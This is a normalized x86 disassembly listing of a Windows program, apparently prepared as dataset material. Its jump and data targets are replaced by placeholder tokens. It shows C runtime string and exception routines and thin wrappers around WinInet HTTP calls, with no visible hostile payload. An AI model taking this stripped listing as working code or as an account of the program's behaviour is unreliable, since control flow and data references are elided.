push eax
call sub_40ba20
pop ecx
pop ecx
pop esi
retn
sub_40db60
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40dc30
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax 0xff
xor ebx ebx
mov edi edi
mov al 0xff
mov edi edi
pop ebx
pop esi
pop edi
leave
retn
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_40dcbc
mov ebx eax
add esp 0x4
call sub_40dcbc
add esp 0x4
cmp bl al
je r-xdata
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
sbb eax eax
sbb eax 0xffffffff
sbb al al
sbb al 0xff
sub_40dcbc
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_409563
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_40c39a
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_4014e0
push esi
mov esi ecx
call sub_401500
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_406b10
add esp 0x4
sub_402320
mov eax [ esp + 0x4 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call [ InternetOpenA@IAT ]
retn 0x4
sub_402430
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ ecx + 0x44 ]
push edx
push 0x1f
push eax
call [ InternetSetOptionA@IAT ]
retn 0xc
sub_402610
mov eax 0x1
retn 0x4
sub_402620
mov eax [ esp + 0x4 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call [ HttpSendRequestExA@IAT ]
retn 0x4
sub_402640
xor al al
retn 0x4
sub_402650
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
call [ InternetWriteFile@IAT ]
retn 0x10
sub_402670
mov eax [ esp + 0x4 ]
push 0x0
push 0x0
push 0x0
push eax
call [ HttpEndRequestA@IAT ]
retn 0x4
sub_402690
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0x0
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
call [ HttpQueryInfoA@IAT ]
retn 0x10
sub_4026b0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push 0x0
push 0x0
push eax
push ecx
call [ InternetQueryDataAvailable@IAT ]
retn 0x8
sub_4026d0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
call [ InternetReadFile@IAT ]
retn 0x10
sub_4026f0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn 0x4
push eax
call [ InternetCloseHandle@IAT ]
sub_403009
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
add eax 0x2
test eax eax
jge r-xdata
push eax
call sub_4075a5
mov [ ebp + 0x8 ] eax
add esp 0x4
mov eax r-xdata
retn
xor eax eax
sub_403190
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax * 2 ] 0x0
retn 0x4
sub_4032e0
mov eax 0x7ffffffd
retn
sub_403400
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_403420
or cl al
mov [ rw-data ] cl
sub_403420
push sub_403430
call sub_407620
pop ecx
retn
sub_403430
retn
sub_403440
mov eax ecx
mov [ eax ] r--data
retn
sub_403450
push esi
mov esi ecx
call sub_403470
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_406b10
add esp 0x4
sub_403470
mov [ ecx ] r--data
retn
sub_406980
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_4069a0
or cl al
mov [ rw-data ] cl
sub_4069a0
push sub_403430
call sub_407620
pop ecx
retn
sub_406b10
push [ esp + 0x4 ]
call sub_407d6e
pop ecx
retn
sub_406bd9
mov eax [ ecx + 0x10 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_406c40
push esi
mov esi ecx
call sub_406c03
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_406b10
pop ecx
sub_406d2f
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_406c5c
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_406e17
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_406c5c
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_406e2f
test [ rw-data ] 0x1
jne r-xdata
call sub_406e59
test [ rw-data ] 0x1
jne r-xdata
or [ rw-data ] 0x1
jmp sub_406e65
or [ rw-data ] 0x1
sub_406e59
push sub_403430
call sub_407620
pop ecx
retn
sub_406e65
push sub_406e71
call sub_407620
pop ecx
retn
sub_406e71
retn
sub_406ec3
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_406eca
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_4070f0
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_407194
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40721e
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_407194
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40724a
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_4075a5
push 0x1
push [ esp + 0x8 ]
call sub_408bba
pop ecx
pop ecx
retn
sub_407620
push [ esp + 0x4 ]
call sub_4075b3
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_4077c1
call sub_409484
test eax eax
jne r-xdata
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_409314
add esp 0x10
retn
retn
sub_4077e1
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4077c1
add esp 0xc
retn
sub_4078c3
push [ esp + 0x4 ]
call sub_407838
pop ecx
retn
sub_407a67
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_407a71
mov eax [ rw-data ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ rw-data ] eax
sar eax 0x10
and eax 0x7fff
retn
sub_407d4a
cmp [ rw-data ] 0x2
je r-xdata
push [ esp + 0x4 ]
call sub_40ad89
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_40ad50
sub_407d9d
push esi
mov esi ecx
call sub_407e40
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_406b10
pop ecx
sub_407e40
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_406b10
pop ecx
sub_407e56
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_407e63
mov [ ecx ] r--data
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
retn
push ecx
call sub_407d6e
pop ecx
sub_407e78
push esi
mov esi ecx
call sub_407e63
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_406b10
pop ecx
sub_407f1c
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_408663
push [ ebp - 0x14 ]
call sub_40869a
pop ecx
retn
sub_40869a
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_408afc
xor eax eax
retn
sub_4087c7
push [ ebp - 0x14 ]
call sub_408837
pop ecx
retn
sub_408a19
push 0x1
pop eax
retn
sub_408a1d
mov esp [ ebp - 0x18 ]
jmp sub_408afc
sub_408a7b
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_408a84
mov esp [ ebp - 0x18 ]
jmp sub_408afc
sub_408b39
push 0x1
pop eax
retn
sub_408b8f
push 0x1
pop eax
retn
sub_408d3c
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_408e24
push rw-data
push rw-data
call sub_408e24
add esp 0x10
retn
call eax
sub_408d69
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_408d8b
add esp 0xc
retn
sub_408d7a
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_408d8b
add esp 0xc
retn
sub_408fdc
push 0x1
call sub_408fe5
pop ecx
retn
sub_4099d8
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_409614
pop ecx
mov [ rw-data ] 0x1
sub_40a25d
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_40a26a
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_40a27a
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_40a4b9
call sub_408fdc
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_40ce21
sub_40ad35
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_4071b6
add esp 0x8
pop ebp
retn 0x4
sub_40bbda
push sub_40bb94
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_40bbeb
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_40bbf8
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40bc14
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40bc30
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40bf72
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 8 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_40c34a
push 0x1
pop eax
retn
sub_40c4aa
push 0x1
pop eax
retn
sub_40c55e
push 0x1
pop eax
retn
sub_40c845
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40c85a
inc [ rw-data ]
sub_40d43f
push 0x2
call sub_407d25
pop ecx
retn
sub_40d79f
push 0x1
pop eax
retn
sub_40d80e
push 0x1
pop eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40dd90
mov ecx [ ebp - 0x1c ]
add ecx 0x4
jmp sub_402980
sub_40dd9b
mov ecx [ ebp - 0x1c ]
add ecx 0x14
jmp sub_402980
sub_40dda6
mov ecx [ ebp - 0x1c ]
add ecx 0x30
jmp sub_402980
sub_40ddb1
mov ecx [ ebp - 0x1c ]
add ecx 0x48
jmp sub_402980
sub_40ddbc
mov ecx [ ebp - 0x1c ]
add ecx 0x6c
jmp sub_402980
sub_40ddc7
mov ecx [ ebp - 0x1c ]
add ecx 0x7c
jmp sub_402980
sub_40ddd2
mov ecx [ ebp - 0x1c ]
add ecx 0x8c
jmp sub_402980
sub_40dde0
mov ecx [ ebp - 0x1c ]
add ecx 0x9c
jmp sub_402980
sub_40ddee
mov ecx [ ebp - 0x1c ]
add ecx 0xac
jmp sub_402980
sub_40ddfc
mov ecx [ ebp - 0x1c ]
add ecx 0xcc
jmp sub_402980
sub_40de0a
mov ecx [ ebp - 0x1c ]
add ecx 0xdc
jmp sub_402980
sub_40de18
mov ecx [ ebp - 0x1c ]
add ecx 0xec
jmp sub_4029c0
sub_40de26
mov ecx [ ebp - 0x1c ]
add ecx 0xfc
jmp sub_402980
sub_40de34
mov eax r--data
jmp sub_406f20
sub_40de40
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_402980
sub_40de4b
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_402980
sub_40de56
mov ecx [ ebp - 0x10 ]
add ecx 0x30
jmp sub_402980
sub_40de61
mov ecx [ ebp - 0x10 ]
add ecx 0x48
jmp sub_402980
sub_40de6c
mov ecx [ ebp - 0x10 ]
add ecx 0x6c
jmp sub_402980
sub_40de77
mov ecx [ ebp - 0x10 ]
add ecx 0x7c
jmp sub_402980
sub_40de82
mov ecx [ ebp - 0x10 ]
add ecx 0x8c
jmp sub_402980
sub_40de90
mov ecx [ ebp - 0x10 ]
add ecx 0x9c
jmp sub_402980
sub_40de9e
mov ecx [ ebp - 0x10 ]
add ecx 0xac
jmp sub_402980
sub_40deac
mov ecx [ ebp - 0x10 ]
add ecx 0xcc
jmp sub_402980
sub_40deba
mov ecx [ ebp - 0x10 ]
add ecx 0xdc
jmp sub_402980
sub_40dec8
mov ecx [ ebp - 0x10 ]
add ecx 0xec
jmp sub_4029c0
sub_40ded6
mov ecx [ ebp - 0x10 ]
add ecx 0xfc
jmp sub_402980
sub_40dee4
mov eax r--data
jmp sub_406f20
sub_40def0
lea ecx [ ebp + 0x4 ]
jmp sub_402980
sub_40def8
mov eax r--data
jmp sub_406f20
sub_40df10
lea ecx [ ebp - 0x38 ]
jmp sub_402980
sub_40df18
lea ecx [ ebp - 0x48 ]
jmp sub_402980
sub_40df20
mov eax r--data
jmp sub_406f20
sub_40df30
mov eax r--data
jmp sub_406f20
sub_40df40
mov eax r--data
jmp sub_406f20
sub_40df50
lea ecx [ ebp - 0x118 ]
jmp sub_401500
sub_40df5b
lea ecx [ ebp - 0x16c ]
jmp sub_402980
sub_40df66
lea ecx [ ebp - 0x1a4 ]
jmp sub_402980
sub_40df71
lea ecx [ ebp - 0x1b4 ]
jmp sub_402980
sub_40df7c
lea ecx [ ebp - 0x184 ]
jmp sub_402980
sub_40df87
mov ecx [ ebp - 0x170 ]
jmp sub_402980
sub_40df92
mov ecx [ ebp - 0x174 ]
jmp sub_402980
sub_40df9d
lea ecx [ ebp - 0x15c ]
jmp sub_402980
sub_40dfa8
lea ecx [ ebp - 0x15c ]
jmp sub_402980
sub_40dfb3
lea ecx [ ebp - 0x194 ]
jmp sub_402980
sub_40dfbe
lea ecx [ ebp - 0x1c4 ]
jmp sub_402980
sub_40dfc9
lea ecx [ ebp - 0x1ec ]
jmp sub_402980
sub_40dfd4
lea ecx [ ebp - 0x1d8 ]
jmp sub_405d10
sub_40dfdf
mov ecx [ ebp - 0x1dc ]
jmp sub_402980
sub_40dfea
mov ecx [ ebp - 0x174 ]
jmp sub_402980
sub_40dff5
lea ecx [ ebp - 0x14c ]
jmp sub_402980
sub_40e000
lea ecx [ ebp - 0x138 ]
jmp sub_402980
sub_40e00b
lea ecx [ ebp - 0x128 ]
jmp sub_402980
sub_40e016
mov eax r--data
jmp sub_406f20
sub_40e020
lea ecx [ ebp + 0x8 ]
jmp sub_402980
sub_40e028
lea ecx [ ebp - 0x88 ]
jmp sub_402980
sub_40e033
lea ecx [ ebp - 0x98 ]
jmp sub_402980
sub_40e03e
lea ecx [ ebp - 0x50 ]
jmp sub_405d10
sub_40e046
mov ecx [ ebp - 0x64 ]
jmp sub_402980
sub_40e04e
mov ecx [ ebp - 0x68 ]
jmp sub_402980
sub_40e056
lea ecx [ ebp - 0x1c ]
jmp sub_402980
sub_40e05e
lea ecx [ ebp - 0x78 ]
jmp sub_402980
sub_40e066
lea ecx [ ebp - 0x60 ]
jmp sub_402980
sub_40e06e
lea ecx [ ebp - 0x60 ]
jmp sub_402980
sub_40e076
lea ecx [ ebp - 0x78 ]
jmp sub_402980
sub_40e07e
lea ecx [ ebp - 0x60 ]
jmp sub_402980
sub_40e086
lea ecx [ ebp - 0x40 ]
jmp sub_405d10
sub_40e08e
mov ecx [ ebp - 0xac ]
jmp sub_402980
sub_40e099
mov ecx [ ebp - 0x64 ]
jmp sub_402980
sub_40e0a1
lea ecx [ ebp - 0xa8 ]
jmp sub_402980
sub_40e0ac
lea ecx [ ebp - 0x60 ]
jmp sub_402980
sub_40e0b4
lea ecx [ ebp - 0x30 ]
jmp sub_402980
sub_40e0bc
lea ecx [ ebp - 0x30 ]
jmp sub_402980
sub_40e0c4
lea ecx [ ebp - 0x78 ]
jmp sub_402980
sub_40e0cc
lea ecx [ ebp - 0x60 ]
jmp sub_402980
sub_40e0d4
lea ecx [ ebp - 0x60 ]
jmp sub_402980
sub_40e0dc
lea ecx [ ebp - 0x30 ]
jmp sub_402980
sub_40e0e4
lea ecx [ ebp - 0xcc ]
jmp sub_402980
sub_40e0ef
lea ecx [ ebp - 0xbc ]
jmp sub_402980
sub_40e0fa
mov eax r--data
jmp sub_406f20
sub_40e110
lea ecx [ ebp + 0x8 ]
jmp sub_402980
sub_40e118
lea ecx [ ebp - 0x2c ]
jmp sub_402980
sub_40e120
lea ecx [ ebp - 0x3c ]
jmp sub_402980
sub_40e128
lea ecx [ ebp - 0x4c ]
jmp sub_402980
sub_40e130
mov ecx [ ebp - 0x58 ]
jmp sub_402980
sub_40e138
mov ecx [ ebp - 0x54 ]
jmp sub_402980
sub_40e140
lea ecx [ ebp - 0x1c ]
jmp sub_402980
sub_40e148
mov eax [ ebp - 0x5c ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp sub_402980
sub_40e15f
mov eax r--data
jmp sub_406f20
sub_40e170
lea ecx [ ebp + 0x4 ]
jmp sub_402980
sub_40e178
lea ecx [ ebp - 0x1c ]
jmp sub_402980
sub_40e180
lea ecx [ ebp - 0x3c ]
jmp sub_402980
sub_40e188
mov ecx [ ebp - 0x48 ]
jmp sub_402980
sub_40e190
mov ecx [ ebp - 0x44 ]
jmp sub_402980
sub_40e198
lea ecx [ ebp - 0x2c ]
jmp sub_402980
sub_40e1a0
mov eax r--data
jmp sub_406f20
sub_40e1b0
lea ecx [ ebp + 0x24 ]
jmp sub_402980
sub_40e1b8
lea ecx [ ebp + 0x14 ]
jmp sub_402980
sub_40e1c0
lea ecx [ ebp + 0x4 ]
jmp sub_402980
sub_40e1c8
lea ecx [ ebp - 0x2c ]
jmp sub_402980
sub_40e1d0
lea ecx [ ebp - 0x1c ]
jmp sub_402980
sub_40e1d8
mov eax r--data
jmp sub_406f20
sub_40e1f0
lea ecx [ ebp - 0x21c ]
jmp sub_402980
sub_40e1fb
mov eax r--data
jmp sub_406f20
sub_40e210
lea ecx [ ebp - 0xa0 ]
jmp sub_402980
sub_40e21b
mov eax r--data
jmp sub_406f20
sub_40e230
lea ecx [ ebp + 0x28 ]
jmp sub_402980
sub_40e238
lea ecx [ ebp + 0x18 ]
jmp sub_402980
sub_40e240
lea ecx [ ebp + 0x8 ]
jmp sub_402980
sub_40e248
lea ecx [ ebp - 0x3c ]
jmp sub_402980
sub_40e250
lea ecx [ ebp - 0x2c ]
jmp sub_402980
sub_40e258
lea ecx [ ebp - 0x1c ]
jmp sub_402980
sub_40e260
mov eax [ ebp - 0x40 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp sub_402980
sub_40e277
mov eax r--data
jmp sub_406f20
sub_40e290
lea ecx [ ebp - 0x5c ]
jmp sub_402980
sub_40e298
mov eax r--data
jmp sub_406f20
sub_40e2b0
lea ecx [ ebp - 0x1c ]
jmp sub_402980
sub_40e2b8
mov eax r--data
jmp sub_406f20
sub_40e2d0
lea ecx [ ebp - 0x1c ]
jmp sub_402980
sub_40e2d8
mov eax r--data
jmp sub_406f20
sub_40e2f0
lea ecx [ ebp - 0x1c ]
jmp sub_402980
sub_40e2f8
mov eax r--data
jmp sub_406f20
sub_40e310
mov eax [ ebp + 0x4 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_403430
add esp 0x8
retn
sub_40e321
mov eax r--data
jmp sub_406f20
sub_40e330
lea ecx [ ebp - 0x328 ]
jmp sub_403470
sub_40e33b
mov eax r--data
jmp sub_406f20
sub_40e348
lea ecx [ ebp - 0x20 ]
jmp sub_402980
sub_40e350
mov eax r--data
jmp sub_406f20
sub_40e35c
mov ecx [ ebp - 0x14 ]
jmp sub_407e40
sub_40e364
mov eax r--data
jmp sub_406f20
sub_40e370
mov ecx [ ebp - 0x10 ]
jmp sub_407e40
sub_40e378
mov eax r--data
jmp sub_406f20
sub_40e384
mov ecx [ ebp - 0x10 ]
jmp sub_407e40
sub_40e38c
mov eax r--data
jmp sub_406f20
sub_40e398
mov ecx [ ebp - 0x10 ]
jmp sub_407e40
sub_40e3a0
mov eax r--data
jmp sub_406f20
sub_40e3ac
lea ecx [ ebp - 0x20 ]
jmp sub_402980
sub_40e3b4
mov eax r--data
jmp sub_406f20
sub_40e3c0
mov ecx [ ebp - 0x10 ]
jmp sub_407e40
sub_40e3c8
mov eax r--data
jmp sub_406f20
